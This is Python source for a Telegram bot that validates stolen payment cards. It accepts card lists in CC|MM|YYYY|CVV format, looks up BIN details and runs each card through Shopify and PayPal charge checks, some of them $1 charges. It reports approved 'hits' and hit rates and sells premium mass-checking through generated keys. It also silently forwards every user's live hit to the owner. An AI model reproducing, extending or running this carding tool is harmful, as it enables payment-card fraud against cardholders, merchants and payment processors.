import asyncio
import os
import secrets
import string
import json
import time
import re
import aiohttp
from datetime import datetime, timedelta

from aiogram import Bot, Dispatcher, Router, F
from aiogram.types import Message
from aiogram.filters import Command, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties

# --- BACKEND IMPORTS ---
from api import process_card_async, parse_cc_string, extract_clean_response
from paypal import check_paypal_cc 

BOT_TOKEN = os.getenv("BOT_TOKEN") 
# Support single or multiple admins (comma separated) to prevent string mismatch bugs
RAW_ADMINS = str(os.getenv("ADMIN_ID", ""))
ADMIN_IDS = [x.strip() for x in RAW_ADMINS.split(",") if x.strip()]

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

PREMIUM_FILE = "premium.json"
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"

# --- CORE UTILITIES & VALIDATION ---
def is_admin(user_id):
    return str(user_id) in ADMIN_IDS

def load_db(filename):
    if os.path.exists(filename):
        try:
            with open(filename, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_db(filename, data):
    with open(filename, "w") as f: json.dump(data, f, indent=4)

def check_tier(user_id):
    if is_admin(user_id): return "👑 ADMIN"
    db = load_db(PREMIUM_FILE)
    if str(user_id) in db:
        expiry = datetime.fromisoformat(db[str(user_id)])
        if datetime.now() < expiry: return "💎 PREMIUM"
    return "🆓 FREE"

def add_user(user_id):
    users = load_db(USERS_FILE)
    if str(user_id) not in users:
        users[str(user_id)] = datetime.now().isoformat()
        save_db(USERS_FILE, users)

async def get_bin_info(session, cc):
    try:
        bin6 = cc[:6]
        async with session.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=5) as res:
            if res.status == 200:
                data = await res.json()
                return (
                    data.get('brand', 'Unknown'),
                    data.get('bank', 'Unknown'),
                    data.get('country_name', 'Unknown'),
                    data.get('country_flag', ''),
                    data.get('type', 'Unknown')
                )
    except: pass
    return "Unknown", "Unknown", "Unknown", "", "Unknown"

# --- FSM STATES ---
class AppStates(StatesGroup):
    waiting_shopify_single = State()
    waiting_shopify_mass = State()
    waiting_paypal_single = State()
    waiting_paypal_mass = State()

# --- RESULT UI FORMATTER ---
def format_result(status, checker, result, cc, country, flag, bank, brand, c_type, total, app, dec, err, start_time, tier, username):
    elapsed = time.time() - start_time
    speed = total / elapsed if elapsed > 0 else 0
    hit_rate = round((app / total * 100), 2) if total > 0 else 0
    icon = "✅" if status in ["APPROVED", "CHARGED"] else "❌" if status == "DECLINED" else "⚠️"
    
    return f"""<code>━━━━━━━━━━━━━━━━━━━━
{icon} {checker} — {result}
━━━━━━━━━━━━━━━━━━━━

💳 Card       : {cc}
📍 Country    : {country} {flag}
🏦 Bank       : {bank}
💠 Brand      : {brand}
💳 Type       : {c_type}

📦 Total      : {total}
✅ Approved   : {app}
❌ Declined   : {dec}
⚠️ Errors     : {err}

📈 Hit Rate   : {hit_rate}%
⚡ Speed      : {speed:.2f} cards/s
⏱ Time       : {elapsed:.1f}s

🔑 Tier       : {tier}

━━━━━━━━━━━━━━━━━━━━
👤 User       : @{username}
━━━━━━━━━━━━━━━━━━━━</code>"""

# --- CORE MENU & INFO ---
@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    print(f"[DEBUG] Incoming command from: {message.from_user.id} - /start")
    await state.clear() # Force clear any stuck state
    add_user(message.from_user.id)
    
    menu_text = (
        "<code>👋 Welcome to the Checker Bot\n\n"
        "📌 Available Commands:\n\n"
        "💳 Checkers:\n"
        "• /paypal_mass → Mass PayPal check\n"
        "• /paypal_mass_file → Mass PayPal (TXT File)\n"
        "• /paypal_single → Single PayPal check\n"
        "• /shopify_mass → Mass Shopify check\n"
        "• /shopify_mass_file → Mass Shopify (TXT File)\n"
        "• /shopify_single → Single Shopify check\n\n"
        "🔑 Keys:\n"
        "• /redeem → Redeem a key\n\n"
        "⚙️ Other:\n"
        "• /status → View your plan/status\n"
    )
    
    if is_admin(message.from_user.id):
        menu_text += (
            "\n👑 Admin Commands:\n"
            "• /genkey <qty> <days> → Generate keys\n"
            "• /broadcast <msg> → Message all users\n"
            "• /users → Show bot statistics\n"
        )
        
    menu_text += "━━━━━━━━━━━━━━━━━━━━</code>"
    await message.answer(menu_text)

@router.message(Command("status"))
async def cmd_status(message: Message, state: FSMContext):
    print(f"[DEBUG] Incoming command from: {message.from_user.id} - /status")
    await state.clear()
    
    tier = check_tier(message.from_user.id)
    db = load_db(PREMIUM_FILE)
    uid = str(message.from_user.id)
    
    if is_admin(uid):
        expiry_text = "Lifetime"
    elif tier == "💎 PREMIUM":
        exp = datetime.fromisoformat(db[uid])
        expiry_text = exp.strftime('%Y-%m-%d %H:%M:%S')
    else:
        expiry_text = "N/A"
        
    await message.answer(f"👤 <b>Your Status</b>\n━━━━━━━━━━\n🔑 <b>Tier:</b> {tier}\n⏳ <b>Expires:</b> {expiry_text}")

# --- KEY & ADMIN SYSTEM ---
@router.message(Command("genkey"))
async def cmd_genkey(message: Message, command: CommandObject, state: FSMContext):
    print(f"[DEBUG] Incoming command from: {message.from_user.id} - /genkey")
    await state.clear()
    
    if not is_admin(message.from_user.id): 
        return await message.answer("❌ Admin only command.")
    
    args = command.args
    if not args:
        return await message.answer("⚠️ Usage: <code>/genkey &lt;count&gt; &lt;duration&gt;</code>\nExample: <code>/genkey 10 7d</code>")
    
    try:
        parts = args.split()
        count = int(parts[0])
        duration_str = parts[1].lower()
        days = int(duration_str.replace('d', '')) if 'd' in duration_str else int(duration_str)
    except:
        return await message.answer("⚠️ Invalid format. Use: <code>/genkey 10 7d</code>")
        
    keys_db = load_db(KEYS_FILE)
    generated = []
    
    for _ in range(count):
        k = "BEAR-" + "".join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(12))
        keys_db[k] = days
        generated.append(f"<code>{k}</code>")
        
    save_db(KEYS_FILE, keys_db)
    await message.answer(f"✅ <b>Generated {count} Keys ({days} Days)</b>\n\n" + "\n".join(generated))

@router.message(Command("redeem"))
async def cmd_redeem(message: Message, command: CommandObject, state: FSMContext):
    print(f"[DEBUG] Incoming command from: {message.from_user.id} - /redeem")
    await state.clear()
    
    key = command.args
    if not key:
        return await message.answer("⚠️ Usage: <code>/redeem &lt;key&gt;</code>")
        
    keys_db = load_db(KEYS_FILE)
    if key not in keys_db:
        return await message.answer("❌ Invalid or expired key.")
        
    days = keys_db[key]
    prem_db = load_db(PREMIUM_FILE)
    uid = str(message.from_user.id)
    
    current_expiry = datetime.now()
    if uid in prem_db:
        saved_exp = datetime.fromisoformat(prem_db[uid])
        if saved_exp > current_expiry:
            current_expiry = saved_exp
            
    prem_db[uid] = (current_expiry + timedelta(days=days)).isoformat()
    del keys_db[key]
    save_db(PREMIUM_FILE, prem_db)
    save_db(KEYS_FILE, keys_db)
    
    await message.answer(f"✅ <b>Successfully Redeemed!</b>\nAdded {days} days to your subscription.")

@router.message(Command("broadcast"))
async def cmd_broadcast(message: Message, command: CommandObject, state: FSMContext):
    print(f"[DEBUG] Incoming command from: {message.from_user.id} - /broadcast")
    await state.clear()
    
    if not is_admin(message.from_user.id): return
    if not command.args: return await message.answer("⚠️ Include a message to broadcast.")
    
    users = load_db(USERS_FILE)
    sent = 0
    msg = await message.answer(f"⏳ Broadcasting to {len(users)} users...")
    
    for uid in users:
        try:
            await bot.send_message(uid, f"📢 <b>Announcement</b>\n━━━━━━━━━━\n{command.args}")
            sent += 1
            await asyncio.sleep(0.05)
        except: pass
        
    await msg.edit_text(f"✅ Broadcast complete. Sent to {sent}/{len(users)} users.")

@router.message(Command("users"))
async def cmd_users(message: Message, state: FSMContext):
    print(f"[DEBUG] Incoming command from: {message.from_user.id} - /users")
    await state.clear()
    
    if not is_admin(message.from_user.id): return
    users = load_db(USERS_FILE)
    prem = load_db(PREMIUM_FILE)
    await message.answer(f"📊 <b>Bot Statistics</b>\n━━━━━━━━━━\n👥 Total Users: {len(users)}\n💎 Premium Users: {len(prem)}")

# --- CHECKER PROCESSOR (SINGLE & MASS) ---
async def process_checker(message: Message, text: str, checker: str):
    user_id = message.from_user.id
    tier = check_tier(user_id)
    
    # Strictly allow admins to bypass the block logic
    if tier == "🆓 FREE" and "mass" in checker.lower() and not is_admin(user_id):
        return await message.answer("❌ Upgrade to Premium to use Mass Checkers.")
        
    ccs = re.findall(r"\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}", text)
    if not ccs:
        return await message.answer("❌ No valid cards found. Ensure format is CC|MM|YYYY|CVV")
        
    total_cards = len(ccs)
    if total_cards > 1 and "single" in checker.lower() and not is_admin(user_id):
        return await message.answer("⚠️ You provided multiple cards for a Single Check. Use Mass Check instead.")
        
    msg = await message.answer(f"⏳ <b>Initializing {checker}...</b>\nProcessing {total_cards} cards.")
    
    app, dec, err = 0, 0, 0
    start_time = time.time()
    username = message.from_user.username or message.from_user.first_name
    
    async with aiohttp.ClientSession() as session:
        for idx, cc in enumerate(ccs, 1):
            parts = parse_cc_string(cc)
            cc_clean, mes, ano, cvv = parts['cc'], parts['mes'], parts['ano'], parts['cvv']
            brand, bank, country, flag, c_type = await get_bin_info(session, cc_clean)
            
            try:
                if "Shopify" in checker:
                    success, raw, g_name, p, c = await process_card_async(cc_clean, mes, ano, cvv, "https://shop.spam.com")
                    status = "CHARGED" if success else "DECLINED"
                    resp = extract_clean_response(raw)
                else: 
                    status, raw = await asyncio.to_thread(check_paypal_cc, cc)
                    resp = extract_clean_response(raw)
            except Exception as e:
                status, resp = "ERROR", str(e)[:30]
                
            if status in ["APPROVED", "CHARGED"]: app += 1
            elif status == "DECLINED": dec += 1
            else: err += 1
            
            ui_text = format_result(
                status, checker, resp, cc, country, flag, bank, brand, c_type, 
                idx, app, dec, err, start_time, tier, username
            )
            
            # Send LIVE/APPROVED directly
            if status in ["APPROVED", "CHARGED", "LIVE"]:
                await message.answer(ui_text) 
                
                # Send to OWNER_ID silently (Fallback safely to primary admin)
                owner = ADMIN_IDS[0] if ADMIN_IDS else None
                if owner and str(user_id) != owner:
                    try: await bot.send_message(owner, f"🔥 <b>NEW HIT</b>\n{ui_text}")
                    except: pass
            
            if total_cards == 1 or (idx % 3 == 0) or idx == total_cards:
                progress_header = f"⏳ <b>Checking... ({idx}/{total_cards})</b>\n\n" if idx < total_cards else f"✅ <b>Check Completed!</b>\n\n"
                try: await msg.edit_text(progress_header + ui_text)
                except: pass
                
            await asyncio.sleep(0.5)

# --- COMMAND ROUTERS (ENTRY POINTS) ---
@router.message(Command("shopify_single"))
async def start_shopify_single(message: Message, state: FSMContext):
    print(f"[DEBUG] Incoming command from: {message.from_user.id} - /shopify_single")
    await state.clear()
    await message.answer("🟢 Send the card to check (CC|MM|YYYY|CVV):")
    await state.set_state(AppStates.waiting_shopify_single)

@router.message(Command("shopify_mass"))
@router.message(Command("shopify_mass_file"))
async def start_shopify_mass(message: Message, state: FSMContext):
    print(f"[DEBUG] Incoming command from: {message.from_user.id} - /shopify_mass")
    await state.clear()
    await message.answer("🟢 Send your list of cards (Text or .txt File) for Mass Check:")
    await state.set_state(AppStates.waiting_shopify_mass)

@router.message(Command("paypal_single"))
async def start_paypal_single(message: Message, state: FSMContext):
    print(f"[DEBUG] Incoming command from: {message.from_user.id} - /paypal_single")
    await state.clear()
    await message.answer("🔵 Send the card to check (CC|MM|YYYY|CVV):")
    await state.set_state(AppStates.waiting_paypal_single)

@router.message(Command("paypal_mass"))
@router.message(Command("paypal_mass_file"))
async def start_paypal_mass(message: Message, state: FSMContext):
    print(f"[DEBUG] Incoming command from: {message.from_user.id} - /paypal_mass")
    await state.clear()
    await message.answer("🔵 Send your list of cards (Text or .txt File) for Mass Check:")
    await state.set_state(AppStates.waiting_paypal_mass)

# --- FSM PROCESSORS ---
@router.message(AppStates.waiting_shopify_single)
async def exe_shopify_single(message: Message, state: FSMContext):
    print(f"[DEBUG] Processing FSM from: {message.from_user.id} - Shopify Single")
    await state.clear()
    await process_checker(message, message.text, "Shopify Single")

@router.message(AppStates.waiting_shopify_mass)
async def exe_shopify_mass(message: Message, state: FSMContext):
    print(f"[DEBUG] Processing FSM from: {message.from_user.id} - Shopify Mass")
    await state.clear()
    text = message.text
    if message.document:
        file = await bot.get_file(message.document.file_id)
        result = await bot.download_file(file.file_path)
        text = result.read().decode('utf-8')
    await process_checker(message, text, "Shopify Mass")

@router.message(AppStates.waiting_paypal_single)
async def exe_paypal_single(message: Message, state: FSMContext):
    print(f"[DEBUG] Processing FSM from: {message.from_user.id} - PayPal Single")
    await state.clear()
    await process_checker(message, message.text, "PayPal Single ($1)")

@router.message(AppStates.waiting_paypal_mass)
async def exe_paypal_mass(message: Message, state: FSMContext):
    print(f"[DEBUG] Processing FSM from: {message.from_user.id} - PayPal Mass")
    await state.clear()
    text = message.text
    if message.document:
        file = await bot.get_file(message.document.file_id)
        result = await bot.download_file(file.file_path)
        text = result.read().decode('utf-8')
    await process_checker(message, text, "PayPal Mass ($1)")

# --- MAIN DEPLOYMENT ---
async def main():
    print("BEAR OS PRO DEPLOYED - COMMAND SYSTEM READY (ADMIN HOTFIX APPLIED)")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
